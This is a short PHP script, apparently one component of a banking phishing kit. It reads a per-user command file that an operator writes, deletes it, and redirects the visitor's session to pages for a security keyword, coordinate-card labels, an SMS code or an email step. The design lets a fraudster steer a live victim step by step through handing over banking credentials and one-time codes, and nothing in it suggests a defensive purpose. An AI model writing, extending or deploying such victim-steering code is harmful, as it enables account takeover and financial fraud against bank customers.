<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if (!isset($_SESSION['usuario'])) exit;

$usuario = $_SESSION['usuario'];
$archivo = "acciones/$usuario.txt";

if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);

    if (str_starts_with($accion, "/palabra clave/")) {
        $pregunta = explode("/palabra clave/", $accion)[1];
        $_SESSION['pregunta'] = $pregunta;
        header("Location: pregunta.php");
        exit;
    }

    if (str_starts_with($accion, "/coordenadas etiquetas/")) {
        $etiquetas = explode("/coordenadas etiquetas/", $accion)[1];
        $_SESSION['etiquetas'] = explode(",", $etiquetas);
        header("Location: coordenadas.php");
        exit;
    }

    if ($accion == "/SMS") {
        header("Location: sms.php");
        exit;
    }

    if ($accion == "/CORREO") {
        header("Location: correo.php");
        exit;
    }
}
?>
